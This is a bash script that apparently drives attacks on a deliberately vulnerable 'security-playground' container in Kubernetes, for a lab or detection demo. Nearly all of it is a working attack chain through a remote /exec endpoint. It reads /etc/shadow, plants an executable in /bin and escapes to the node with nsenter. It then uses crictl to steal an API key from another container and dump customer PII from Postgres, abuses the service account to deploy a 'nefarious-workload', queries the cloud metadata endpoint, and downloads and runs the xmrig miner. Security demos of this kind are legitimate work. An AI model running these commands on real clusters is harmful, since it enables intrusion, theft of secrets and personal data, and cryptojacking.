#!/usr/bin/env bash
# Script to demonstrate how to interact with security-playground

NODE_IP=$(kubectl get nodes -o wide | awk 'FNR == 2 {print $6}')
NODE_PORT=30002
HELLO_NAMESPACE=hello

# Try to reach hello-server for our NetworkPolicy example later
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=curl http://hello-server.$HELLO_NAMESPACE.svc:8080" > /dev/null

echo "1. Reading a sensitive file (/etc/shadow)"
echo "--------------------------------------------------------------------------------"
echo "Running curl $NODE_IP:$NODE_PORT/etc/shadow"
echo "---"
curl $NODE_IP:$NODE_PORT/etc/shadow
echo "--------------------------------------------------------------------------------"
sleep 15


echo "2. Writing a new file to a sensitive path (/bin), setting it to be executable and then running it"
echo "--------------------------------------------------------------------------------"
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/bin/hello -d \'content=echo \"hello-world\"\'"
echo "---"
curl -s -X POST $NODE_IP:$NODE_PORT/bin/hello -d 'content=echo "hello-world"'
echo ""
echo "---"
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=chmod 0755 /bin/hello'"
echo "---"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=chmod 0755 /bin/hello'
echo "---"
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=hello'"
echo "---"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=hello'
echo "--------------------------------------------------------------------------------"
sleep 15

echo "3. Installing nmap from apt and then run a network scan"
echo "--------------------------------------------------------------------------------"
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=apt-get update; apt-get -y install nmap;nmap -v scanme.nmap.org'"
echo "---"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=apt-get update; apt-get -y install nmap;nmap -v scanme.nmap.org'
echo "--------------------------------------------------------------------------------"
sleep 15

echo "4. Breaking out of our container with nsenter to install crictl in /usr/bin"
echo "--------------------------------------------------------------------------------"
ARCH=$(curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=dpkg --print-architecture')
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d \"command=nsenter --all --target=1 wget -q https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.29.0/crictl-v1.29.0-linux-$ARCH.tar.gz\""
echo "---"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 wget -q https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.29.0/crictl-v1.29.0-linux-$ARCH.tar.gz"
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d \"command=nsenter --all --target=1 tar -zxvf crictl-v1.29.0-linux-$ARCH.tar.gz -C /usr/bin\""
echo "---"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 tar -zxvf crictl-v1.29.0-linux-$ARCH.tar.gz -C /usr/bin"
echo "--------------------------------------------------------------------------------"
sleep 15

echo "5. Breaking out of our Linux namespace to the host's with nsenter and running crictl against the Node's container runtime"
echo "--------------------------------------------------------------------------------"
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=nsenter --all --target=1 crictl ps'"
echo "---"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=nsenter --all --target=1 crictl ps'
echo "--------------------------------------------------------------------------------"
sleep 15

echo "6. Stealing a secret from another container on the same Node (hello-client in the $HELLO_NAMESPACE Namespace) with crictl"
echo "--------------------------------------------------------------------------------"
HELLO_ID=$(curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=nsenter --all --target=1 crictl ps --name hello-client -q')
HELLO_ID_1=`echo "${HELLO_ID}" | head -1`
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d \"command=nsenter --all --target=1 crictl exec $HELLO_ID_1 /bin/sh -c set\" | grep API_KEY"
echo "---"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 crictl exec $HELLO_ID_1 /bin/sh -c set" | grep API_KEY
echo "--------------------------------------------------------------------------------"
sleep 15

echo "7. Exfiltrating some data from another container running on the same Node (a Postgres database in the postgres-sakila Namespace) with crictl"
echo "--------------------------------------------------------------------------------"
POSTGRES_ID=$(curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=nsenter --all --target=1 crictl ps --name postgres-sakila -q')
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d \"command=nsenter --all --target=1 crictl exec $POSTGRES_ID psql -U postgres -c \'SELECT c.first_name, c.last_name, c.email, a.address, a.postal_code FROM customer c JOIN address a ON (c.address_id = a.address_id)\'\""
echo "---"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 crictl exec $POSTGRES_ID psql -U postgres -c 'SELECT c.first_name, c.last_name, c.email, a.address, a.postal_code FROM customer c JOIN address a ON (c.address_id = a.address_id)'"
echo "--------------------------------------------------------------------------------"
sleep 15

echo "8. Downloading/Installing kubectl then calling the Kubernetes API via security-playground's access (via its ServiceAccount)"
echo "--------------------------------------------------------------------------------"
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d \"command=curl -O https://s3.us-west-2.amazonaws.com/amazon-eks/1.28.3/2023-11-14/bin/linux/$ARCH/kubectl\""
echo "---"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=curl -O https://s3.us-west-2.amazonaws.com/amazon-eks/1.28.3/2023-11-14/bin/linux/$ARCH/kubectl"
echo "---"
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=chmod 0755 ./kubectl'"
echo "---"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=chmod 0755 ./kubectl'
echo "---"
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=./kubectl create deployment nefarious-workload --image=public.ecr.aws/m9h2b5e7/security-playground:070124'"
echo "---"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=./kubectl create deployment nefarious-workload --image=public.ecr.aws/m9h2b5e7/security-playground:070124'
echo "---"
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=./kubectl get pods'"
echo "---"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=./kubectl get pods'
echo "--------------------------------------------------------------------------------"
sleep 15

echo "9. Calling the Node's AWS Instance Metadata Endpoint from within the security-playground container"
echo "--------------------------------------------------------------------------------"
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=curl http://169.254.169.254/latest/meta-data/iam/info'"
echo "---"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=curl http://169.254.169.254/latest/meta-data/iam/info'
echo "--------------------------------------------------------------------------------"
sleep 15

echo "10. Downloading and running a common crypto miner (xmrig)"
echo "--------------------------------------------------------------------------------"
if [[ "$ARCH" == "amd64" ]]; then
    echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d \"command=wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz -O xmrig.tar.gz\""
    echo "---"
    curl -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz -O xmrig.tar.gz"    
else
    echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d \"command=wget https://z9k65lokhn70.s3.amazonaws.com/xmrig-6.20.0-linux-static-arm64.tar.gz -O xmrig.tar.gz\""
    echo "---"
    curl -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=wget https://z9k65lokhn70.s3.amazonaws.com/xmrig-6.20.0-linux-static-arm64.tar.gz -O xmrig.tar.gz"   
fi
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=tar -xzvf xmrig.tar.gz'"
echo "---"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=tar -xzvf xmrig.tar.gz'
echo "---"
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=xmrig-6.20.0/xmrig'"
echo "---"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=xmrig-6.20.0/xmrig'